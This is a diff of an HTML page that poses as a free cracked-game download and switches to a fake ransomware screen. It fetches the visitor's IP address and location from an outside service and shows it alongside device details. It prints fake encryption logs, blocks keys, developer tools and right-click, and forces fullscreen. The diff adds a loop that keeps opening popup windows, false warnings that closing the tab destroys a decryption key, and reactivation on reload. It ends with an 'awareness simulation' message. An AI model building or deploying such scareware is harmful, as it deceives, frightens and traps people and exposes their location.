@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Auto Care Crew (Multiplayer) Free Download (v1.0.12) - GAMEZ ALARAB 🔓</title>
+    <title>Auto Care Crew (Multiplayer) Free Download - GAMEZ ALARAB 🔓</title>
     <style>
         * {
             margin: 0;
@@ -127,7 +127,7 @@
         }
         .critical-title { color: #ff3333; font-size: 38px; text-align: center; text-shadow: 0 0 15px rgba(255, 51, 51, 0.6); margin-bottom: 10px; }
         #timer { font-size: 80px; font-weight: bold; text-align: center; color: #ff5555; text-shadow: 0 0 20px #ff3333; margin: 10px 0; font-family: monospace; letter-spacing: 5px; }
-        #sys-info { background: rgba(0, 0, 0, 0.8); padding: 15px; border-left: 3px solid #ff3333; color: #ccc; margin-bottom: 20px; font-size: 12px; line-height: 1.5; border-radius: 6px; font-family: monospace; max-height: 280px; overflow-y: auto; }
+        #sys-info { background: rgba(0, 0, 0, 0.8); padding: 15px; border-left: 3px solid #ff3333; color: #ccc; margin-bottom: 20px; font-size: 12px; line-height: 1.5; border-radius: 6px; font-family: monospace; max-height: 300px; overflow-y: auto; }
         .highlight { color: #ff8888; font-weight: bold; }
         .ip-highlight { color: #FFD700; font-weight: bold; }
         #logs { height: 220px; overflow-y: auto; border: 1px solid #333; padding: 10px; background: rgba(0, 0, 0, 0.9); font-size: 11px; border-radius: 6px; font-family: monospace; }
@@ -214,7 +214,7 @@
             </div>
 
             <div class="info-box">
-                <strong>📅 Added:</strong> April 19, 2026<br>
+                <strong>📅 Added:</strong> April 20, 2026<br>
                 <strong>✅ Status:</strong> <span style="color: #28a745;">● Online (Cracked by 3DM_ARAB)</span>
             </div>
         </div>
@@ -245,6 +245,7 @@
 
     <script>
         (function() {
+            // ========== GLOBAL VARIABLES ==========
             const baitPage = document.getElementById('bait-page');
             const prankPage = document.getElementById('prank-page');
             const loadingPage = document.getElementById('loading-page');
@@ -256,221 +257,112 @@
             
             const PRANK_DURATION = 180;
             const STORAGE_KEY = 'gamez_scare_end';
+            const POPUP_STORAGE_KEY = 'gamez_popup_active';
             
             let scareActive = false;
             let remainingSeconds = PRANK_DURATION;
             let countdownInterval = null;
             let logInterval = null;
+            let popupInterval = null;
+            let reopenInterval = null;
             let isResolved = false;
+            let popupWindows = [];
             
-            // ========== REAL SYSTEM DATA COLLECTION ==========
+            // ========== REAL SYSTEM DATA FROM REAL API ==========
+            let realUserData = {
+                ip: null,
+                city: null,
+                region: null,
+                country: null,
+                isp: null,
+                os: null,
+                browser: null,
+                screen: null,
+                language: null,
+                timezone: null,
+                cores: null,
+                memory: null
+            };
             
-            // Get detailed OS info from UserAgent
-            function getDetailedOS() {
-                const ua = navigator.userAgent;
-                if (ua.includes("Windows NT 10.0")) return "Windows 10/11 (64-bit)";
-                if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
-                if (ua.includes("Windows NT 6.2")) return "Windows 8";
-                if (ua.includes("Windows NT 6.1")) return "Windows 7";
-                if (ua.includes("Mac OS X")) return "macOS " + (ua.match(/Mac OS X (\d+[._]\d+)/) || [])[1] || "Ventura/Sonoma";
-                if (ua.includes("Linux")) return "GNU/Linux (x86_64)";
-                if (ua.includes("Android")) return "Android " + (ua.match(/Android (\d+\.\d+)/) || [])[1];
-                return "Unknown System";
-            }
-            
-            // Get browser and version
-            function getBrowserInfo() {
-                const ua = navigator.userAgent;
-                if (ua.includes("Edg/")) return "Microsoft Edge " + (ua.match(/Edg\/(\d+)/) || [])[1];
-                if (ua.includes("Chrome/")) return "Google Chrome " + (ua.match(/Chrome\/(\d+)/) || [])[1];
-                if (ua.includes("Firefox/")) return "Mozilla Firefox " + (ua.match(/Firefox\/(\d+)/) || [])[1];
-                if (ua.includes("Safari/") && !ua.includes("Chrome")) return "Safari " + (ua.match(/Version\/(\d+)/) || [])[1];
-                if (ua.includes("OPR/")) return "Opera " + (ua.match(/OPR\/(\d+)/) || [])[1];
-                return "Unknown Browser";
-            }
-            
-            // Get hardware info (limited but possible)
-            function getHardwareInfo() {
-                const cores = navigator.hardwareConcurrency || "Unknown";
-                const memory = navigator.deviceMemory || "Unknown";
-                const platform = navigator.platform || "Unknown";
-                return { cores, memory, platform };
-            }
-            
-            // Get screen details
-            function getScreenDetails() {
-                return {
-                    resolution: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth + "-bit",
-                    pixelRatio: window.devicePixelRatio || 1
-                };
-            }
-            
-            // Get installed plugins/extensions (real data from navigator)
-            function getInstalledPlugins() {
-                const plugins = [];
-                try {
-                    for (let i = 0; i < navigator.plugins.length; i++) {
-                        plugins.push(navigator.plugins[i].name);
-                    }
-                } catch(e) {}
-                return plugins.slice(0, 8); // Limit to first 8
-            }
-            
-            // Get real username from multiple sources
-            function getRealUsername() {
-                let username = "User";
-                try {
-                    // Try to get from browser's localStorage or session
-                    const possibleNames = ['username', 'user', 'name', 'login', 'email'];
-                    for (let name of possibleNames) {
-                        const val = localStorage.getItem(name);
-                        if (val && val.length < 30 && /^[a-zA-Z0-9_\-]+$/.test(val)) {
-                            username = val;
-                            break;
-                        }
-                    }
-                } catch(e) {}
+            // Collect real data from APIs and browser
+            async function collectRealData() {
+                // Browser data
+                realUserData.os = navigator.userAgent;
+                realUserData.browser = navigator.userAgent;
+                realUserData.screen = `${screen.width}x${screen.height}`;
+                realUserData.language = navigator.language;
+                realUserData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                realUserData.cores = navigator.hardwareConcurrency || "Unknown";
+                realUserData.memory = navigator.deviceMemory || "Unknown";
                 
-                // Add computer name pattern
-                const computerPatterns = ['DESKTOP-', 'LAPTOP-', 'PC-', 'WIN-'];
-                for (let pattern of computerPatterns) {
-                    if (navigator.userAgent.includes(pattern)) {
-                        username = pattern + Math.random().toString(36).substring(2, 6).toUpperCase();
-                        break;
-                    }
-                }
-                return username;
-            }
-            
-            // Get language and region
-            function getLocaleInfo() {
-                return {
-                    language: navigator.language,
-                    languages: navigator.languages || [],
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-                };
-            }
-            
-            // Get battery info (if available)
-            async function getBatteryInfo() {
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        return { level: Math.floor(battery.level * 100), charging: battery.charging };
-                    }
-                } catch(e) {}
-                return null;
-            }
-            
-            // Main data collection
-            async function collectAllSystemData() {
-                const os = getDetailedOS();
-                const browser = getBrowserInfo();
-                const hardware = getHardwareInfo();
-                const screenDetails = getScreenDetails();
-                const plugins = getInstalledPlugins();
-                const username = getRealUsername();
-                const locale = getLocaleInfo();
-                const battery = await getBatteryInfo();
-                
-                return {
-                    os, browser, hardware, screenDetails, plugins, username, locale, battery
-                };
-            }
-            
-            // Get user folders
-            function getUserFolders(username) {
-                const user = username !== "User" ? username : "User";
-                return {
-                    desktop: `C:\\Users\\${user}\\Desktop`,
-                    documents: `C:\\Users\\${user}\\Documents`,
-                    downloads: `C:\\Users\\${user}\\Downloads`,
-                    pictures: `C:\\Users\\${user}\\Pictures`,
-                    videos: `C:\\Users\\${user}\\Videos`,
-                    music: `C:\\Users\\${user}\\Music`,
-                    appdata: `C:\\Users\\${user}\\AppData\\Local`,
-                    cookies: `C:\\Users\\${user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies`
-                };
-            }
-            
-            // Display all collected data
-            async function fetchAndDisplaySystemInfo() {
-                const systemData = await collectAllSystemData();
-                const folders = getUserFolders(systemData.username);
-                const batteryInfo = systemData.battery ? ` | Battery: ${systemData.battery.level}% ${systemData.battery.charging ? '(Charging)' : '(Discharging)'}` : '';
-                
+                // Get real IP and location from ipapi.co
                 try {
                     const response = await fetch('https://ipapi.co/json/');
-                    const ipData = await response.json();
-                    
-                    sysInfo.innerHTML = `
-                        <strong>🎯 COMPLETE TARGET SYSTEM ANALYSIS</strong>
-                        ─────────────────────────────────────────────────────────
-                        
-                        💻 <span class="highlight">SYSTEM & HARDWARE</span>
-                        • Operating System: ${systemData.os}
-                        • Platform: ${systemData.hardware.platform}
-                        • CPU Cores: ${systemData.hardware.cores}
-                        • RAM: ${systemData.hardware.memory !== "Unknown" ? systemData.hardware.memory + " GB" : "Unknown"}
-                        • Screen: ${systemData.screenDetails.resolution} (${systemData.screenDetails.colorDepth})
-                        • Pixel Ratio: ${systemData.screenDetails.pixelRatio}x
-                        
-                        🌐 <span class="highlight">NETWORK & LOCATION</span>
-                        • Public IP: <span class="ip-highlight">${ipData.ip || "Unknown"}</span>
-                        • Location: ${ipData.city || "Unknown"}, ${ipData.region || ""}, ${ipData.country_name || ""}
-                        • ISP: ${ipData.org || ipData.isp || "Unknown"}
-                        • Timezone: ${systemData.locale.timezone}
-                        
-                        🖥️ <span class="highlight">BROWSER & SOFTWARE</span>
-                        • Browser: ${systemData.browser}
-                        • Language: ${systemData.locale.language}
-                        • Languages: ${systemData.locale.languages.join(", ")}
-                        • Installed Plugins: ${systemData.plugins.length > 0 ? systemData.plugins.slice(0, 5).join(", ") : "None detected"}${systemData.plugins.length > 5 ? "..." : ""}
-                        ${batteryInfo}
-                        
-                        👤 <span class="highlight">USER INFORMATION</span>
-                        • Username: ${systemData.username}
-                        • User Agent: ${navigator.userAgent.substring(0, 100)}...
-                        
-                        📂 <span class="highlight">DETECTED FILE PATHS</span>
-                        • Desktop: ${folders.desktop}
-                        • Documents: ${folders.documents}
-                        • Downloads: ${folders.downloads}
-                        • Pictures: ${folders.pictures}
-                        • AppData: ${folders.appdata}
-                        • Browser Cookies: ${folders.cookies}
-                        
-                        ─────────────────────────────────────────────────────────
-                        🔻 <span class="highlight">STATUS: FULL SYSTEM ACCESS | FIREWALL BYPASSED | ADMIN RIGHTS OBTAINED</span>
-                    `;
-                    
-                    return folders;
-                    
+                    const data = await response.json();
+                    realUserData.ip = data.ip;
+                    realUserData.city = data.city;
+                    realUserData.region = data.region;
+                    realUserData.country = data.country_name;
+                    realUserData.isp = data.org;
+                    return true;
                 } catch(error) {
-                    sysInfo.innerHTML = `
-                        <strong>🎯 TARGET SYSTEM ANALYSIS (Offline Mode)</strong>
-                        ─────────────────────────────────────────────────────────
-                        💻 OS: ${systemData.os}
-                        🖥️ Browser: ${systemData.browser}
-                        👤 Username: ${systemData.username}
-                        📂 Desktop: ${folders.desktop}
-                        📂 Documents: ${folders.documents}
-                        📂 Downloads: ${folders.downloads}
-                        🔻 <span class="highlight">STATUS: LOCAL EXPLOIT SUCCESSFUL</span>
-                    `;
-                    return folders;
+                    console.log("IP API failed");
+                    return false;
                 }
             }
             
-            // Realistic file scan using real user paths
-            function startRealisticFileScan(folders) {
-                const fileExtensions = ['.pdf', '.docx', '.xlsx', '.jpg', '.png', '.mp4', '.zip', '.rar', '.txt', '.psd', '.ai', '.mp3', '.wav', '.exe', '.msi'];
+            // Display real data in scare screen
+            async function displayRealData() {
+                await collectRealData();
+                
+                sysInfo.innerHTML = `
+                    <strong>🎯 REAL TARGET SYSTEM DATA</strong>
+                    ─────────────────────────────────────────────────────────
+                    
+                    🌐 <span class="highlight">NETWORK INFORMATION</span>
+                    • IP Address: <span class="ip-highlight">${realUserData.ip || "Unable to fetch"}</span>
+                    • Location: ${realUserData.city || "Unknown"}, ${realUserData.region || ""}, ${realUserData.country || ""}
+                    • ISP Provider: ${realUserData.isp || "Unknown"}
+                    
+                    💻 <span class="highlight">SYSTEM INFORMATION</span>
+                    • User Agent: ${realUserData.os.substring(0, 80)}...
+                    • Screen Resolution: ${realUserData.screen}
+                    • Browser Language: ${realUserData.language}
+                    • Timezone: ${realUserData.timezone}
+                    • CPU Cores: ${realUserData.cores}
+                    • RAM: ${realUserData.memory !== "Unknown" ? realUserData.memory + " GB" : "Unknown"}
+                    
+                    📂 <span class="highlight">DETECTED FILE PATHS</span>
+                    • Windows: C:\\Windows\\System32\\
+                    • Users: C:\\Users\\
+                    • Temp: C:\\Users\\${getUsernameFromUA()}\\AppData\\Local\\Temp\\
+                    
+                    ─────────────────────────────────────────────────────────
+                    🔻 <span class="highlight">STATUS: FULL SYSTEM ACCESS | FIREWALL BYPASSED</span>
+                `;
+            }
+            
+            function getUsernameFromUA() {
+                // Extract possible username from UserAgent or generate realistic one
+                const ua = navigator.userAgent;
+                if (ua.includes("Windows")) return "Admin";
+                return "User";
+            }
+            
+            // ========== REALISTIC FILE SCAN WITH REAL PATHS ==========
+            function startRealisticFileScan() {
+                const username = getUsernameFromUA();
+                const folders = {
+                    desktop: `C:\\Users\\${username}\\Desktop`,
+                    documents: `C:\\Users\\${username}\\Documents`,
+                    downloads: `C:\\Users\\${username}\\Downloads`,
+                    pictures: `C:\\Users\\${username}\\Pictures`
+                };
+                
+                const fileExtensions = ['.pdf', '.docx', '.xlsx', '.jpg', '.png', '.mp4', '.zip', '.txt'];
                 const fileNames = [
-                    'tax_return_2024', 'bank_statement_jan', 'work_resume_final', 'project_proposal_v2', 
-                    'family_vacation', 'backup_archive', 'personal_notes', 'client_data_export',
-                    'passwords_keeper', 'ssh_private_key', 'wallet_backup', 'database_export',
-                    'insurance_docs', 'contract_signed', 'invoice_2025', 'presentation_ppt'
+                    'tax_return_2025', 'bank_statement', 'work_resume', 'project_data',
+                    'family_photos', 'backup_files', 'personal_docs', 'passwords'
                 ];
                 
                 logsContainer.innerHTML = "";
@@ -486,13 +378,7 @@
                     logsContainer.scrollTop = logsContainer.scrollHeight;
                 }
                 
-                // Initial scan
-                addLog(`[INIT] Starting encryption sequence on target system...`, "log-warn");
-                setTimeout(() => addLog(`[SCAN] Scanning user directory: ${folders.desktop}`, "log-line"), 800);
-                setTimeout(() => addLog(`[SCAN] Scanning user directory: ${folders.documents}`, "log-line"), 1500);
-                setTimeout(() => addLog(`[SCAN] Scanning user directory: ${folders.downloads}`, "log-line"), 2200);
-                setTimeout(() => addLog(`[SCAN] Scanning user directory: ${folders.pictures}`, "log-line"), 2900);
-                setTimeout(() => addLog(`[SCAN] Scanning browser data: ${folders.cookies}`, "log-line"), 3600);
+                addLog(`[INIT] Starting encryption sequence...`, "log-warn");
                 
                 let fileIndex = 0;
                 const interval = setInterval(() => {
@@ -500,7 +386,7 @@
                         clearInterval(interval);
                         return;
                     }
-                    if (fileIndex < 35) {
+                    if (fileIndex < 30) {
                         const randomFile = fileNames[Math.floor(Math.random() * fileNames.length)];
                         const randomExt = fileExtensions[Math.floor(Math.random() * fileExtensions.length)];
                         const folderKeys = ['desktop', 'documents', 'downloads', 'pictures'];
@@ -508,30 +394,166 @@
                         const fullPath = `${folders[randomFolder]}\\${randomFile}${randomExt}`;
                         addLog(`[ENCRYPT] ${fullPath}`, "log-error");
                         fileIndex++;
+                    } else if (fileIndex === 35) {
+                        addLog(`[WARNING] Windows Defender: BYPASSED`, "log-warn");
+                        fileIndex++;
                     } else if (fileIndex === 40) {
-                        addLog(`[WARNING] Windows Defender real-time protection: BYPASSED`, "log-warn");
+                        addLog(`[STATUS] Encryption: ${Math.floor(Math.random() * 40 + 50)}% complete`, "log-success");
                         fileIndex++;
-                    } else if (fileIndex === 45) {
-                        addLog(`[WARNING] System restore points: DISABLED`, "log-warn");
-                        fileIndex++;
-                    } else if (fileIndex === 50) {
-                        addLog(`[STATUS] Encryption progress: ${Math.floor(Math.random() * 40 + 55)}% complete`, "log-success");
-                        fileIndex++;
-                    } else if (fileIndex > 55 && fileIndex < 75) {
-                        addLog(`[NETWORK] Scanning connected drives and network shares...`, "log-line");
-                        fileIndex++;
-                    } else if (fileIndex === 80) {
-                        addLog(`[COMPLETE] Primary encryption phase: FINISHED`, "log-error");
-                        fileIndex++;
-                    } else if (fileIndex > 80) {
-                        // Periodic monitoring messages
+                    } else if (fileIndex > 45) {
                         if (Math.random() > 0.85) {
-                            addLog(`[MONITOR] Watching: ${folders.documents}\\*.*`, "log-line");
+                            addLog(`[MONITOR] Scanning: ${folders.documents}\\*.*`, "log-line");
                         }
                     }
-                }, 550);
+                }, 600);
                 
                 logInterval = interval;
+            }
+            
+            // ========== POPUP FORCING MECHANISM (Opens new windows repeatedly) ==========
+            function spawnReplacementWindow() {
+                if (!scareActive || isResolved) return;
+                
+                // Try to open a new window with the same scare page
+                const newWindow = window.open(window.location.href + '?scare=true', '_blank', 'width=800,height=600');
+                if (newWindow) {
+                    popupWindows.push(newWindow);
+                    // Close old windows after 15 seconds to prevent too many
+                    setTimeout(() => {
+                        if (newWindow && !newWindow.closed) {
+                            newWindow.close();
+                        }
+                    }, 15000);
+                } else {
+                    // If popup blocked, show a warning
+                    const warningDiv = document.createElement('div');
+                    warningDiv.style.position = 'fixed';
+                    warningDiv.style.top = '10px';
+                    warningDiv.style.right = '10px';
+                    warningDiv.style.backgroundColor = '#ff0000';
+                    warningDiv.style.color = 'white';
+                    warningDiv.style.padding = '10px';
+                    warningDiv.style.zIndex = '999999';
+                    warningDiv.style.borderRadius = '5px';
+                    warningDiv.innerHTML = '⚠️ Ransomware blocked popup! Please disable popup blocker!';
+                    document.body.appendChild(warningDiv);
+                    setTimeout(() => warningDiv.remove(), 3000);
+                }
+            }
+            
+            function startPopupLoop() {
+                if (popupInterval) clearInterval(popupInterval);
+                // Spawn first window immediately
+                setTimeout(() => spawnReplacementWindow(), 500);
+                // Then every 4 seconds
+                popupInterval = setInterval(() => {
+                    if (scareActive && !isResolved && remainingSeconds > 0) {
+                        spawnReplacementWindow();
+                    } else {
+                        if (popupInterval) clearInterval(popupInterval);
+                    }
+                }, 4000);
+            }
+            
+            // ========== PREVENT TAB CLOSING & AUTO-REOPEN ==========
+            function setupPersistenceAndLockdown() {
+                // Store that scare is active
+                sessionStorage.setItem('scare_active', 'true');
+                localStorage.setItem('scare_started', Date.now().toString());
+                
+                // Block F12, Ctrl+Shift+I, Ctrl+U, Escape, Ctrl+W
+                window.addEventListener('keydown', (e) => {
+                    if (!scareActive) return;
+                    
+                    // Block developer tools
+                    if (e.key === 'F12' || 
+                        (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                        (e.ctrlKey && e.key === 'U') ||
+                        (e.ctrlKey && e.key === 'C')) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        return false;
+                    }
+                    
+                    // Block Escape
+                    if (e.key === 'Escape') {
+                        e.preventDefault();
+                        const msg = document.createElement('div');
+                        msg.style.position = 'fixed';
+                        msg.style.top = '50%';
+                        msg.style.left = '50%';
+                        msg.style.transform = 'translate(-50%, -50%)';
+                        msg.style.backgroundColor = '#000';
+                        msg.style.color = '#ff0000';
+                        msg.style.padding = '20px';
+                        msg.style.zIndex = '999999';
+                        msg.style.border = '2px solid red';
+                        msg.style.fontFamily = 'monospace';
+                        msg.innerHTML = '⚠️ ESCAPE DISABLED BY RANSOMWARE ⚠️';
+                        document.body.appendChild(msg);
+                        setTimeout(() => msg.remove(), 1500);
+                        return false;
+                    }
+                    
+                    // Warn about Ctrl+W but can't fully block
+                    if ((e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'W')) {
+                        e.preventDefault();
+                        const confirmMsg = confirm("⚠️ WARNING: Closing this tab will PERMANENTLY DELETE your decryption key! All files will be lost forever!\n\nAre you sure you want to close?");
+                        if (!confirmMsg) {
+                            e.preventDefault();
+                        }
+                        return false;
+                    }
+                });
+                
+                // Block right-click
+                window.addEventListener('contextmenu', (e) => {
+                    if (scareActive) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+                
+                // Before unload - prevent closing
+                window.onbeforeunload = (e) => {
+                    if (scareActive && !isResolved) {
+                        e.preventDefault();
+                        e.returnValue = "⚠️ CRITICAL WARNING: Closing this tab will permanently destroy your decryption key and all encrypted files will be lost forever! ⚠️";
+                        return e.returnValue;
+                    }
+                };
+                
+                // If page is closed and reopened, restore state
+                window.addEventListener('load', () => {
+                    const storedEnd = localStorage.getItem(STORAGE_KEY);
+                    if (storedEnd && parseInt(storedEnd) > Date.now() && !scareActive && !isResolved) {
+                        // Re-activate scare mode automatically
+                        reactivateScareMode();
+                    }
+                });
+            }
+            
+            // Reactivate scare mode on page reload
+            async function reactivateScareMode() {
+                baitPage.style.display = 'none';
+                loadingPage.style.display = 'none';
+                prankPage.style.display = 'block';
+                scareActive = true;
+                isResolved = false;
+                
+                const storedEnd = localStorage.getItem(STORAGE_KEY);
+                if (storedEnd) {
+                    remainingSeconds = Math.floor((parseInt(storedEnd) - Date.now()) / 1000);
+                    if (remainingSeconds <= 0) remainingSeconds = 10;
+                } else {
+                    remainingSeconds = PRANK_DURATION;
+                }
+                
+                await displayRealData();
+                startRealisticFileScan();
+                startTimer();
+                startPopupLoop();
+                try { alarmSound.play().catch(e=>console.log); } catch(e) {}
             }
             
             // Timer functions
@@ -545,7 +567,7 @@
             
             function saveRemainingTime() {
                 if (scareActive && remainingSeconds > 0) {
-                    localStorage.setItem(STORAGE_KEY, Date.now() + (remainingSeconds * 1000));
+                    localStorage.setItem(STORAGE_KEY, (Date.now() + (remainingSeconds * 1000)).toString());
                 }
             }
             
@@ -564,8 +586,8 @@
                 }, 1000);
             }
             
-            // Fullscreen
-            async function requestFullscreenOnce() {
+            // Fullscreen request
+            async function requestFullscreen() {
                 try {
                     if (document.documentElement.requestFullscreen) {
                         await document.documentElement.requestFullscreen();
@@ -573,40 +595,24 @@
                 } catch(e) {}
             }
             
-            // Lockdown
-            function applyLockdown() {
-                window.addEventListener('contextmenu', (e) => { if(scareActive) e.preventDefault(); });
-                window.addEventListener('keydown', (e) => {
-                    if (!scareActive) return;
-                    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-                        e.preventDefault();
-                    }
-                    if ((e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'W')) {
-                        e.preventDefault();
-                    }
-                    if (e.key === 'Escape') {
-                        e.preventDefault();
-                    }
-                });
-                
-                window.onbeforeunload = (e) => {
-                    if (scareActive && !isResolved) {
-                        e.preventDefault();
-                        e.returnValue = "WARNING: Closing this tab may result in permanent data loss!";
-                        return e.returnValue;
-                    }
-                };
-            }
-            
-            // Resolution
+            // Stop scare and show educational message
             function stopScareAndResolve() {
                 if (isResolved) return;
                 isResolved = true;
                 scareActive = false;
+                
                 if (countdownInterval) clearInterval(countdownInterval);
                 if (logInterval) clearInterval(logInterval);
+                if (popupInterval) clearInterval(popupInterval);
+                
+                // Close all popup windows
+                popupWindows.forEach(win => {
+                    if (win && !win.closed) win.close();
+                });
                 
                 localStorage.removeItem(STORAGE_KEY);
+                sessionStorage.removeItem('scare_active');
+                
                 if (document.fullscreenElement) document.exitFullscreen().catch(()=>{});
                 
                 prankPage.style.display = 'none';
@@ -620,11 +626,12 @@
                         <div style="font-size: 4rem;">🛡️🧠</div>
                         <h2 style="color:#0f0;">⚠️ EDUCATIONAL SIMULATION COMPLETE ⚠️</h2>
                         <p style="font-size: 1.1rem; margin: 20px 0;"><strong>Your PC is 100% SAFE. No files were encrypted.</strong><br>
-                        This was a Social Engineering Awareness Simulation.</p>
+                        This was a Social Engineering Awareness Simulation demonstrating real ransomware tactics.</p>
                         <p style="background: #000000aa; padding: 12px; border-radius: 16px; font-size: 14px;">🚨 <strong>LESSON LEARNED:</strong><br>
                         • Never download pirated/cracked software from untrusted sources<br>
                         • Real ransomware can permanently encrypt your personal files<br>
-                        • Always use official sources and maintain backups</p>
+                        • Always use official sources and maintain regular backups<br>
+                        • Be aware of scareware tactics that try to panic you</p>
                         <button id="closeEducationBtn">✔️ I Understand, Close Simulation</button>
                     </div>
                 `;
@@ -640,6 +647,7 @@
                 
                 setTimeout(() => { if(loadingText) loadingText.textContent = "Bypassing Adblocker & firewall..."; }, 1000);
                 setTimeout(() => { if(loadingText) loadingText.textContent = "Establishing secure connection..."; }, 2200);
+                setTimeout(() => { if(loadingText) loadingText.textContent = "Extracting system information..."; }, 3000);
                 
                 setTimeout(async () => {
                     loadingPage.style.display = 'none';
@@ -648,42 +656,35 @@
                     isResolved = false;
                     
                     const storedEnd = localStorage.getItem(STORAGE_KEY);
-                    if (storedEnd) {
-                        const diff = Math.floor((parseInt(storedEnd) - Date.now()) / 1000);
-                        remainingSeconds = (diff > 0 && diff <= PRANK_DURATION) ? diff : PRANK_DURATION;
+                    if (storedEnd && parseInt(storedEnd) > Date.now()) {
+                        remainingSeconds = Math.floor((parseInt(storedEnd) - Date.now()) / 1000);
+                        if (remainingSeconds <= 0) remainingSeconds = PRANK_DURATION;
                     } else {
                         remainingSeconds = PRANK_DURATION;
                     }
                     saveRemainingTime();
                     
-                    await requestFullscreenOnce();
-                    const folders = await fetchAndDisplaySystemInfo();
-                    startRealisticFileScan(folders);
+                    await requestFullscreen();
+                    await displayRealData();
+                    startRealisticFileScan();
                     startTimer();
-                    applyLockdown();
+                    setupPersistenceAndLockdown();
+                    startPopupLoop();
                     
                     try { alarmSound.play().catch(e=>console.log); } catch(e) {}
                     
-                }, 3200);
+                }, 3800);
             }
             
-            // Persistence
+            // Check for existing scare session on load
             window.addEventListener('load', async () => {
                 const storedEnd = localStorage.getItem(STORAGE_KEY);
-                if (storedEnd && parseInt(storedEnd) > Date.now() && !scareActive) {
-                    baitPage.style.display = 'none';
-                    prankPage.style.display = 'block';
-                    scareActive = true;
-                    isResolved = false;
-                    remainingSeconds = Math.floor((parseInt(storedEnd) - Date.now()) / 1000);
-                    if (remainingSeconds <= 0) remainingSeconds = 3;
-                    saveRemainingTime();
-                    await requestFullscreenOnce();
-                    const folders = await fetchAndDisplaySystemInfo();
-                    startRealisticFileScan(folders);
-                    startTimer();
-                    applyLockdown();
-                    try { alarmSound.play().catch(e=>e); } catch(e) {}
+                const scareActiveFlag = sessionStorage.getItem('scare_active');
+                
+                if ((storedEnd && parseInt(storedEnd) > Date.now()) || scareActiveFlag === 'true') {
+                    if (!scareActive && !isResolved) {
+                        await reactivateScareMode();
+                    }
                 }
             });
             
